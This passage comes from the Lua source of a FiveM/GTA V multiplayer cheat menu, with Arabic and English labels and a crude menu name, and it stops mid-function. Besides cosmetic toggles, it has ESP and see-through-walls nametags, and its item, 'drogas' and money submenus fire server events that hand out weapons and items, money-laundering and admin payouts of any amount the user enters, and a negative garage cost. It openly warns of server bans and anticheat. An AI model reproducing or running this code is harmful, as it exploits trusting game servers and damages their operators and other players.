					SetVehicleDoorShut(bi, 1, true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
				LeftBackDoor = not LeftBackDoor;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if LeftBackDoor then
					SetVehicleDoorOpen(bi, 2, nil, true)
				elseif not LeftBackDoor then
					SetVehicleDoorShut(bi, 2, true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
				RightBackDoor = not RightBackDoor;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if RightBackDoor then
					SetVehicleDoorOpen(bi, 3, nil, true)
				elseif not RightBackDoor then
					SetVehicleDoorShut(bi, 3, true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("Hood", FrontHood, "Closed", "Opened") then
				FrontHood = not FrontHood;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if FrontHood then
					SetVehicleDoorOpen(bi, 4, nil, true)
				elseif not FrontHood then
					SetVehicleDoorShut(bi, 4, true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("Trunk", Trunk, "Closed", "Opened") then
				Trunk = not Trunk;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if Trunk then
					SetVehicleDoorOpen(bi, 5, nil, true)
				elseif not Trunk then
					SetVehicleDoorShut(bi, 5, true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("Back", Back, "Closed", "Opened") then
				Back = not Back;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if Back then
					SetVehicleDoorOpen(bi, 6, nil, true)
				elseif not Back then
					SetVehicleDoorShut(bi, 6, true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("Back 2", Back2, "Closed", "Opened") then
				Back2 = not Back2;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if Back2 then
					SetVehicleDoorOpen(bi, 7, nil, true)
				elseif not Back2 then
					SetVehicleDoorShut(bi, 7, true)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("world") then
			if IhadSexWithMyStepMother.MenuButton("ﻮﺠﻟﺍ ﺮﻴﻴﻐﺗ ~r~(CLIENT SIDE)", "weather") then
			elseif IhadSexWithMyStepMother.MenuButton("ﻮﺠﻟﺍ ﺮﻴﻴﻐﺗ", "time") then
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﺍﺭﺎﻴﺴﻟﺍ ﻑﺎﻘﻳﺍ", CarsDisabled) then
				CarsDisabled = not CarsDisabled
			elseif IhadSexWithMyStepMother.CheckBox("ﺔﺤﻠﺳﻷﺍ ﻑﺎﻘﻳﺍ", GunsDisabled) then
				GunsDisabled = not GunsDisabled
			elseif IhadSexWithMyStepMother.CheckBox("ﻖﻳﺮﻄﻟﺍ ﻦﻣ ﺕﺍﺭﺎﻴﺴﻟﺍ ﺀﺎﻔﺧﺍ", ClearStreets) then
				ClearStreets = not ClearStreets
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﺍﺭﺎﻴﺴﻟﺍ ﺝﺎﻋﺯﺍ", NoisyCars) then
				NoisyCars = not NoisyCars;
				if not NoisyCars then
					for cP in EnumerateVehicles() do
						SetVehicleAlarmTimeLeft(cP, 0)
					end
				end
			elseif IhadSexWithMyStepMother.ComboBoxSlider("ﺔﻴﺑﺫﺎﺠﻟﺍ", GravityOpsWords, gh, gi, function(aD, aE)
				gh = aD;
				gi = aD;
				GravAmount = GravityOps[gh]
				for cP in EnumerateVehicles() do
					RequestControlOnce(cP)
					SetVehicleGravityAmount(cP, GravAmount)
				end
			end) then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("time") then
			if IhadSexWithMyStepMother.CheckBox("Christmas Weather", XMAS) then
				XMAS = not XMAS;
				if XMAS then
					SetForceVehicleTrails(true)
					SetForcePedFootstepsTracks(true)
					SetWeatherTypePersist("XMAS")
					SetWeatherTypeNowPersist("XMAS")
					SetWeatherTypeNow("XMAS")
					SetOverrideWeather("XMAS")
				end
			elseif IhadSexWithMyStepMother.CheckBox("Blizzard Weather", BLIZZARD) then
				BLIZZARD = not BLIZZARD;
				if BLIZZARD then
					SetWeatherTypePersist("BLIZZARD")
					SetWeatherTypeNowPersist("BLIZZARD")
					SetWeatherTypeNow("BLIZZARD")
					SetOverrideWeather("BLIZZARD")
				end
			elseif IhadSexWithMyStepMother.CheckBox("Foggy Weather", FOGGY) then
				FOGGY = not FOGGY;
				if FOGGY then
					SetWeatherTypePersist("FOGGY")
					SetWeatherTypeNowPersist("FOGGY")
					SetWeatherTypeNow("FOGGY")
					SetOverrideWeather("FOGGY")
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("objectspawner") then
			if IhadSexWithMyStepMother.MenuButton("ﺕﺎﺘﻜﺠﺑﻭﻷﺍ", "objectlist") then
			elseif IhadSexWithMyStepMother.ComboBox("~g~ﺖﻜﺠﺑﻭﻷﺍ ﻉﻮﻧ ﺭﺎﺘﺧﺍ~~y~ -->", objs_tospawn, g8, g9, function(aD, aE)
				g8 = aD;
				g9 = aD;
				obj = objs_tospawn[g8]
			end) then
			elseif IhadSexWithMyStepMother.Button("~g~ﺖﻜﺠﺑﻭﻷﺍ ﺖﻨﺒﺳﺭ") then
				local pos = GetEntityCoords(PlayerPedId())
				local dh = GetEntityPitch(PlayerPedId())
				local hG = GetEntityRoll(PlayerPedId())
				local f4 = GetEntityRotation(PlayerPedId()).z;
				local fq = GetEntityForwardX(PlayerPedId())
				local fr = GetEntityForwardY(PlayerPedId())
				local hH = nil;
				if gc == 1 then
					hH = CreateObject(GetHashKey(obj), pos.x + fq * 10, pos.y + fr * 10, pos.z - 1, 1, 1, 1)
				elseif gc == 2 then
					hH = CreateObject(GetHashKey(obj), pos.x - fq * 10, pos.y - fr * 10, pos.z - 1, 1, 1, 1)
				end;
				SetEntityRotation(hH, dh, hG, f4 + ObjRotation)
				SetEntityVisible(hH, gV, 0)
				FreezeEntityPosition(hH, 1)
				table.insert(SpawnedObjects, hH)
			elseif IhadSexWithMyStepMother.Button("ﻢﺳﻸﺑ ﺖﻜﺠﺑﻭﺍ ﻦﺒﺳﺮﺗ") then
				local hI = e9("ﺖﻜﺠﺑﻭﻷﺍ ﻢﺳﺍ ﻂﺣ:")
				local pos = GetEntityCoords(PlayerPedId())
				local hJ = CreateObject(GetHashKey(hI), pos.x, pos.y, pos.z - 100, 0, 1, 1)
				SetEntityVisible(hJ, 0, 0)
				if table.contains(objs_tospawn, hI) then
					ShowInfo("~b~Model " .. hI .. " is already spawnable!")
				elseif DoesEntityExist(hJ) then
					objs_tospawn[#objs_tospawn + 1] = hI;
					ShowInfo("~g~Model " .. hI .. " has been added to the list!")
				else
					ShowInfo("~r~Model " .. hI .. " does not exist!")
				end;
				RequestControlOnce(hJ)
				DeleteObject(hJ)
			elseif IhadSexWithMyStepMother.CheckBox("ﻻ ﻻﻭ ﻲﻔﺨﻣ", gV) then
				gV = not gV
			elseif IhadSexWithMyStepMother.ComboBox("ﻚﻣﺍﺪﻗ ﻭﺍ ﻙﺍﺭﻭ ﻦﺒﺳﺮﻳ", {
				"ﻚﻣﺍﺪﻗ",
				"ﻙﺍﺭﻭ"
			}, gc, gd, function(aD, aE)
				gc = aD;
				gd = aD
			end) then
			elseif IhadSexWithMyStepMother.ComboBox("ﺖﻜﺠﺑﻭﻷﺍ ﺓﺎﺠﺗﺍ", RotationOps, ga, gb, function(aD, aE)
				ga = aD;
				gb = aD;
				ObjRotation = RotationOps[ga]
			end) then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("objectlist") then
			if IhadSexWithMyStepMother.Button("ﺔﻨﺒﺳﺮﻤﻟﺍ ﺕﺎﺘﻜﺠﺑﻭﻷﺍ ﻊﻴﻤﺟ ﺢﺴﻣ") then
				for i = 1, #SpawnedObjects do
					RequestControlOnce(SpawnedObjects[i])
					DeleteObject(SpawnedObjects[i])
				end
			else
				for i = 1, #SpawnedObjects do
					if DoesEntityExist(SpawnedObjects[i]) then
						if IhadSexWithMyStepMother.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
							RequestControlOnce(SpawnedObjects[i])
							DeleteObject(SpawnedObjects[i])
						end
					end
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("weather") then
			if IhadSexWithMyStepMother.ComboBox("ﻮﺠﻟﺍ", WeathersList, gF, gG, function(aD, aE)
				gF = aD;
				gG = aD;
				WeatherType = WeathersList[aD]
			end) then
			elseif IhadSexWithMyStepMother.CheckBox("ﻲﺋﺎﻘﻠﺗ ﺓﻮﺠﻟﺍ ﺮﻴﻐﺘﻳ", WeatherChanger, "Disabled", "Enabled") then
				WeatherChanger = not WeatherChanger
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("misc") then
			if IhadSexWithMyStepMother.MenuButton("ﺭﺩﺍﺮﻟﺍ ﺔﻤﺋﺎﻗ", "esp") then
			elseif IhadSexWithMyStepMother.CheckBox("ﺔﻄﻳﺮﺨﻟﺍ ﺽﺮﻓ", ForceMap) then
				ForceMap = not ForceMap
			elseif IhadSexWithMyStepMother.CheckBox("ﻲﻠﺧﺍﺩ ﺭﻮﻈﻨﻣ", ForceThirdPerson) then
				ForceThirdPerson = not ForceThirdPerson
			elseif IhadSexWithMyStepMother.MenuButton("ﻮﻳﺩﺍﺮﻟﺍ ﻞﻴﻐﺸﺗ", "webradio") then
			elseif IhadSexWithMyStepMother.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
				Radio = not Radio;
				ShowInfo("~r~Portable Radio will override any vehicle's radio!")
			elseif IhadSexWithMyStepMother.ComboBox2("Radio Station", RadiosListWords, gD, gE, function(aD, aE)
				gD = aD;
				gE = aD;
				RadioStation = RadiosList[aD]
			end) then
			elseif IhadSexWithMyStepMother.CheckBox("Show Coordinates", ShowCoords) then
				ShowCoords = not ShowCoords
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("esp") then
			if IhadSexWithMyStepMother.CheckBox("ﺰﺒﻠﺑ", BlipsEnabled) then
				ToggleBlips()
			elseif IhadSexWithMyStepMother.CheckBox("ﻦﻴﺒﻋﻷﺍ ﻲﻣﺎﺳﺍ", NametagsEnabled) then
				NametagsEnabled = not NametagsEnabled;
				tags_plist = GetActivePlayers()
				ptags = {}
				for i = 1, #tags_plist do
					ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
					SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
					SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
				end;
				if not NametagsEnabled then
					for i = 1, #ptags do
						SetMpGamerTagVisibility(ptags[i], 4, 0)
						SetMpGamerTagVisibility(ptags[i], 8, 0)
					end
				end
			elseif IhadSexWithMyStepMother.CheckBox("ﻢﻳﺍ ﺔﻄﻘﻧ", Crosshair) then
				Crosshair = not Crosshair
			elseif IhadSexWithMyStepMother.CheckBox("ﻦﻴﺒﻋﻷﺍ ﻁﻮﻄﺧ", LinesEnabled) then
				LinesEnabled = not LinesEnabled
			elseif IhadSexWithMyStepMother.CheckBox("(OneSync) Nametags", ANametagsEnabled) then
				ANametagsEnabled = not ANametagsEnabled
			elseif IhadSexWithMyStepMother.CheckBox("Nametags Through Walls", ANametagsNotNeedLOS) then
				ANametagsNotNeedLOS = not ANametagsNotNeedLOS
			elseif IhadSexWithMyStepMother.CheckBox("ESP", ESPEnabled) then
				f8()
			elseif IhadSexWithMyStepMother.ComboBoxSlider("ESP Distance", ESPDistanceOps, gn, go, function(aD, aE)
				gn = aD;
				go = aD;
				EspDistance = ESPDistanceOps[gn]
			end) then
			elseif IhadSexWithMyStepMother.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, gp, gq, function(aD, aE)
				gp = aD;
				gq = aD;
				if aD == 1 then
					ESPRefreshTime = 0
				elseif aD == 2 then
					ESPRefreshTime = 100
				elseif aD == 3 then
					ESPRefreshTime = 250
				elseif aD == 4 then
					ESPRefreshTime = 500
				elseif aD == 5 then
					ESPRefreshTime = 1000
				elseif aD == 6 then
					ESPRefreshTime = 2000
				elseif aD == 7 then
					ESPRefreshTime = 5000
				end
			end) then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("webradio") then
			if IhadSexWithMyStepMother.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
				ClassicalRadio = not ClassicalRadio;
				if ClassicalRadio then
					RadioDUI = CreateDui("https://youtu.be/2CPJndD4z6A", 1, 1)
					ShowInfo("~b~Now Playing...")
				else
					DestroyDui(RadioDUI)
					ShowInfo("~r~Web Radio Stopped!")
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("teleport") then
			if IhadSexWithMyStepMother.MenuButton("ﻦﻛﺎﻤﻟﺍ ﻆﻔﺣ", "saveload") then
			elseif IhadSexWithMyStepMother.Button("~b~ﺕﺎﻴﺛﺍﺪﺣﺍ ﻰﻟﺍ ﻝﺎﻘﺘﻧﺍ") then
				TeleportToCoords()
			elseif IhadSexWithMyStepMother.MenuButton("~b~ ﻦﻛﺎﻣﺍ ﻰﻟﺍ ﻝﺎﻘﺘﻧﺍ", "pois") then
			elseif IhadSexWithMyStepMother.Button("~b~TPﺕﺎﻴﺛﺍﺪﺣﺍ ﻰﻟﺍ ﻝﺎﻘﺘﻧﺍ") then
				f0()
			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ FBI") then
				ek()
			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ LS Customs") then
				eo()
			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ Main Garage") then
				ep()
			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ Ammunation") then
				er()
			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ Clothes shop") then
				es()
			elseif IhadSexWithMyStepMother.Button("~b~TP~s~ Barber") then
				et()
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("saveload") then
			if IhadSexWithMyStepMother.ComboBox("Saved Location 1", {
				"save",
				"load"
			}, gt, gu, function(aD, aE)
				gt = aD;
				gu = aD
			end) then
				if gu == 1 then
					gO = GetEntityCoords(PlayerPedId())
					ShowInfo("~g~Position 1 Saved")
				else
					if not gO then
						ShowInfo("~r~There is no saved position for slot 1!")
					else
						SetEntityCoords(PlayerPedId(), gO)
						ShowInfo("~g~Position 1 Loaded")
					end
				end
			elseif IhadSexWithMyStepMother.ComboBox("Saved Location 2", {
				"save",
				"load"
			}, gv, gw, function(aD, aE)
				gv = aD;
				gw = aD
			end) then
				if gw == 1 then
					gP = GetEntityCoords(PlayerPedId())
					ShowInfo("~g~Position 2 Saved")
				else
					if not gP then
						ShowInfo("~r~There is no saved position for slot 2!")
					else
						SetEntityCoords(PlayerPedId(), gP)
						ShowInfo("~g~Position 2 Loaded")
					end
				end
			elseif IhadSexWithMyStepMother.ComboBox("Saved Location 3", {
				"save",
				"load"
			}, gx, gy, function(aD, aE)
				gx = aD;
				gy = aD
			end) then
				if gy == 1 then
					gQ = GetEntityCoords(PlayerPedId())
					ShowInfo("~g~Position 3 Saved")
				else
					if not gQ then
						ShowInfo("~r~There is no saved position for slot 3!")
					else
						SetEntityCoords(PlayerPedId(), gQ)
						ShowInfo("~g~Position 3 Loaded")
					end
				end
			elseif IhadSexWithMyStepMother.ComboBox("Saved Location 4", {
				"save",
				"load"
			}, gz, gA, function(aD, aE)
				gz = aD;
				gA = aD
			end) then
				if gA == 1 then
					gR = GetEntityCoords(PlayerPedId())
					ShowInfo("~g~Position 4 Saved")
				else
					if not gR then
						ShowInfo("~r~There is no saved position for slot 4!")
					else
						SetEntityCoords(PlayerPedId(), gR)
						ShowInfo("~g~Position 4 Loaded")
					end
				end
			elseif IhadSexWithMyStepMother.ComboBox("Saved Location 5", {
				"save",
				"load"
			}, gB, gC, function(aD, aE)
				gB = aD;
				gC = aD
			end) then
				if gC == 1 then
					gS = GetEntityCoords(PlayerPedId())
					ShowInfo("~g~Position 5 Saved")
				else
					if not gS then
						ShowInfo("~r~There is no saved position for slot 5!")
					else
						SetEntityCoords(PlayerPedId(), gS)
						ShowInfo("~g~Position 5 Loaded")
					end
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("pois") then
			if IhadSexWithMyStepMother.Button("Car Dealership (Simeon's)") then
				SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
			elseif IhadSexWithMyStepMother.Button("Legion Square") then
				SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
			elseif IhadSexWithMyStepMother.Button("Grove Street") then
				SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
			elseif IhadSexWithMyStepMother.Button("LSPD HQ") then
				SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
			elseif IhadSexWithMyStepMother.Button("Sandy Shores BCSO HQ") then
				SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
			elseif IhadSexWithMyStepMother.Button("Paleto Bay BCSO HQ") then
				SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
			elseif IhadSexWithMyStepMother.Button("FIB Top Floor") then
				SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
			elseif IhadSexWithMyStepMother.Button("FIB Offices") then
				SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
			elseif IhadSexWithMyStepMother.Button("Michael's House") then
				SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
			elseif IhadSexWithMyStepMother.Button("Franklin's First House") then
				SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
			elseif IhadSexWithMyStepMother.Button("Franklin's Second House") then
				SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
			elseif IhadSexWithMyStepMother.Button("Trevor's Trailer") then
				SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
			elseif IhadSexWithMyStepMother.Button("Tequi-La-La") then
				SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("lua") then
			if IhadSexWithMyStepMother.MenuButton("~y~CFW Item (QB)", "drogas") then
			elseif IhadSexWithMyStepMother.MenuButton("~r~CFW ~s~Options", "esx") then
			elseif IhadSexWithMyStepMother.MenuButton("~b~VRP ~s~Options", "vrp") then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("mecanico") then
			if IhadSexWithMyStepMother.Button("~b~Harvest GasCan") then
				TriggerServerEvent("esx_mechanicjob:startHarvest")
				TriggerServerEvent("esx_mechanicjob:startHarvest")
				TriggerServerEvent("esx_mechanicjob:startHarvest")
				TriggerServerEvent("esx_mechanicjob:startHarvest")
				TriggerServerEvent("esx_mechanicjob:startHarvest")
			elseif IhadSexWithMyStepMother.Button("~b~Harvest RepairTools") then
				TriggerServerEvent("esx_mechanicjob:startHarvest2")
				TriggerServerEvent("esx_mechanicjob:startHarvest2")
				TriggerServerEvent("esx_mechanicjob:startHarvest2")
				TriggerServerEvent("esx_mechanicjob:startHarvest2")
				TriggerServerEvent("esx_mechanicjob:startHarvest2")
			elseif IhadSexWithMyStepMother.Button("~b~Harvest BodyTools") then
				TriggerServerEvent("esx_mechanicjob:startHarvest3")
				TriggerServerEvent("esx_mechanicjob:startHarvest3")
				TriggerServerEvent("esx_mechanicjob:startHarvest3")
				TriggerServerEvent("esx_mechanicjob:startHarvest3")
				TriggerServerEvent("esx_mechanicjob:startHarvest3")
			elseif IhadSexWithMyStepMother.Button("~b~Harvest TunerChip") then
				TriggerServerEvent("esx_mechanicjob:startHarvest4")
				TriggerServerEvent("esx_mechanicjob:startHarvest4")
				TriggerServerEvent("esx_mechanicjob:startHarvest4")
				TriggerServerEvent("esx_mechanicjob:startHarvest4")
				TriggerServerEvent("esx_mechanicjob:startHarvest4")
			elseif IhadSexWithMyStepMother.Button("~c~Craft Blowtorch") then
				TriggerServerEvent("esx_mechanicjob:startCraft")
				TriggerServerEvent("esx_mechanicjob:startCraft")
				TriggerServerEvent("esx_mechanicjob:startCraft")
				TriggerServerEvent("esx_mechanicjob:startCraft")
				TriggerServerEvent("esx_mechanicjob:startCraft")
			elseif IhadSexWithMyStepMother.Button("~c~Craft RepairKit") then
				TriggerServerEvent("esx_mechanicjob:startCraft2")
				TriggerServerEvent("esx_mechanicjob:startCraft2")
				TriggerServerEvent("esx_mechanicjob:startCraft2")
				TriggerServerEvent("esx_mechanicjob:startCraft2")
				TriggerServerEvent("esx_mechanicjob:startCraft2")
			elseif IhadSexWithMyStepMother.Button("~c~Craft BodyKit") then
				TriggerServerEvent("esx_mechanicjob:startCraft3")
				TriggerServerEvent("esx_mechanicjob:startCraft3")
				TriggerServerEvent("esx_mechanicjob:startCraft3")
				TriggerServerEvent("esx_mechanicjob:startCraft3")
				TriggerServerEvent("esx_mechanicjob:startCraft3")
			elseif IhadSexWithMyStepMother.Button("~y~Harvest Bitcoin") then
				TriggerServerEvent("esx_bitcoin:startHarvestKoda")
				TriggerServerEvent("esx_bitcoin:startHarvestKoda")
				TriggerServerEvent("esx_bitcoin:startHarvestKoda")
				TriggerServerEvent("esx_bitcoin:startHarvestKoda")
				TriggerServerEvent("esx_bitcoin:startHarvestKoda")
			elseif IhadSexWithMyStepMother.Button("~y~Sell Bitcoin") then
				TriggerServerEvent("esx_bitcoin:startSellKoda")
				TriggerServerEvent("esx_bitcoin:startSellKoda")
				TriggerServerEvent("esx_bitcoin:startSellKoda")
				TriggerServerEvent("esx_bitcoin:startSellKoda")
				TriggerServerEvent("esx_bitcoin:startSellKoda")
			elseif IhadSexWithMyStepMother.Button("~r~Stop all") then
				TriggerServerEvent("esx_drugs:stopHarvestCoke")
				TriggerServerEvent("esx_drugs:stopTransformCoke")
				TriggerServerEvent("esx_drugs:stopSellCoke")
				TriggerServerEvent("esx_drugs:stopHarvestMeth")
				TriggerServerEvent("esx_drugs:stopTransformMeth")
				TriggerServerEvent("esx_drugs:stopSellMeth")
				TriggerServerEvent("esx_drugs:stopHarvestWeed")
				TriggerServerEvent("esx_drugs:stopTransformWeed")
				TriggerServerEvent("esx_drugs:stopSellWeed")
				TriggerServerEvent("esx_drugs:stopHarvestOpium")
				TriggerServerEvent("esx_drugs:stopTransformOpium")
				TriggerServerEvent("esx_drugs:stopSellOpium")
				TriggerServerEvent("esx_mechanicjob:stopHarvest")
				TriggerServerEvent("esx_mechanicjob:stopHarvest2")
				TriggerServerEvent("esx_mechanicjob:stopHarvest2")
				TriggerServerEvent("esx_mechanicjob:stopHarvest4")
				TriggerServerEvent("esx_mechanicjob:stopCraft")
				TriggerServerEvent("esx_mechanicjob:stopCraft2")
				TriggerServerEvent("esx_mechanicjob:stopCraft3")
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("drogas") then
			if IhadSexWithMyStepMother.Button("~h~~g~Give Pistol.50 ~g~❮ ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_pistol50", 1)
                elseif IhadSexWithMyStepMother.Button("~h~~g~Give ~g~heavypistol ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_heavypistol", 1)
                elseif IhadSexWithMyStepMother.Button("~h~~g~Give ~g~pistol ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_pistol", 1)
                elseif IhadSexWithMyStepMother.Button("~h~Give sns ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_snspistol", 1)
                elseif IhadSexWithMyStepMother.Button("~c~Give pistol ammo ~c~(x50)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "pistol_ammo", 50)
                elseif IhadSexWithMyStepMother.Button("~c~Give assaultrifle ammo ~c~(x50)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "rifle_ammo", 50)
                elseif IhadSexWithMyStepMother.Button("~c~Give smg ammo ~c~(x50)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "smg_ammo", 50)
                elseif IhadSexWithMyStepMother.Button("~h~Give GLOCK ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_combatpistol", 1)
                elseif IhadSexWithMyStepMother.Button("~h~~r~Give AK ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_assaultrifle", 1)
                elseif IhadSexWithMyStepMother.Button("~h~~r~Give small AK ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_compactrifle", 1)
                elseif IhadSexWithMyStepMother.Button("~h~~p~Give smg ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_smg", 1)
                elseif IhadSexWithMyStepMother.Button("~h~~p~Give Petrol ~c~(x5)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "weapon_petrolcan", 5)
                elseif IhadSexWithMyStepMother.Button("~r~~h~Give HandCuffs ~c~(x5)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "handcuffs", 5)
                elseif IhadSexWithMyStepMother.Button("~y~~h~Give jewelrycard ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "jewelrycard", 1)
                elseif IhadSexWithMyStepMother.Button("~y~~h~Give Taco ~c~(x20)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "taco", 20)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give plastic ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "plastic", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give metalscrap ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "metalscrap", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give copper ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "copper", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give aluminum ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "aluminum", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give iron ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "iron", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give steel ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "steel", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give rubber ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "rubber", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give glass ~c~(x1000)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "glass", 1000)
                elseif IhadSexWithMyStepMother.Button("~w~~h~Give lighter ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "lighter", 1)
                elseif IhadSexWithMyStepMother.Button("~o~~h~Give copon10 ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "copon10", 1)
                elseif IhadSexWithMyStepMother.Button("~o~~h~Give copon15 ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "copon15", 1)
                elseif IhadSexWithMyStepMother.Button("~o~~h~Give copon25 ~c~(x1)") then
                    TriggerServerEvent("QBCore:Server:AddItem", "copon25", 1)
                elseif IhadSexWithMyStepMother.Button("~v~~v~(AmX Menu)") then
                    local bh = e9("Dev By | AmX.#4083 ", "", 100000)
                    if bh then
                        TriggerServerEvent("esx_moneywash:washMoney", bh)
                        TriggerServerEvent("esx_blackmoney:washMoney", bh)
                        TriggerServerEvent("esx_society:washMoney", bh)
                    end
                end
		elseif IhadSexWithMyStepMother.IsMenuOpened("money") then
			if IhadSexWithMyStepMother.Button("~r~ Money [1] Vrp Dont Use With Rac Anticheat") then
				local hs = e9("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
				if string.lower(hs) == "y" then
					local bh = e9("Enter amount of money ~g~$$$", "", 100000000)
					TriggerServerEvent("esx_truckerjob:pay", bh)
					TriggerServerEvent("vrp_slotmachine:server:2", bh)
					TriggerServerEvent("esx_pizza:pay", bh)
					TriggerServerEvent("esx_jobs:caution", "give_back", bh)
					TriggerServerEvent("lscustoms:payGarage", bh)
					TriggerServerEvent("esx_tankerjob:pay", bh)
					TriggerServerEvent("esx_vehicletrunk:giveDirty", bh)
					TriggerServerEvent("f0ba1292-b68d-4d95-8823-6230cdf282b6", bh)
					TriggerServerEvent("gambling:spend", bh)
					TriggerServerEvent("265df2d8-421b-4727-b01d-b92fd6503f5e", bh)
					TriggerServerEvent("AdminMenu:giveDirtyMoney", bh)
					TriggerServerEvent("AdminMenu:giveBank", bh)
					TriggerServerEvent("AdminMenu:giveCash", bh)
					TriggerServerEvent("esx_slotmachine:sv:2", bh)
					TriggerServerEvent("esx_moneywash:deposit", bh)
					TriggerServerEvent("esx_moneywash:withdraw", bh)
					TriggerServerEvent("esx_moneywash:deposit", bh)
					TriggerServerEvent("mission:completed", bh)
					TriggerServerEvent("truckerJob:success", bh)
					TriggerServerEvent("c65a46c5-5485-4404-bacf-06a106900258", bh)
					TriggerServerEvent("dropOff", bh)
					TriggerServerEvent("truckerfuel:success", bh)
					TriggerServerEvent("delivery:success", bh)
					TriggerServerEvent("lscustoms:payGarage", {
						costs = -bh
					})
					TriggerServerEvent("esx_brinksjob:pay", bh)
					TriggerServerEvent("esx_garbagejob:pay", bh)
					TriggerServerEvent("esx_postejob:pay", bh)
					TriggerServerEvent("esx_garbage:pay", bh)
					TriggerServerEvent("esx_carteirojob:pay", bh)
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 2 ~y~Esx~s~ | ~b~vRP ~r~(RISK) (All_Jobs)") then
				local hs = e9("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
				if string.lower(hs) == "y" then
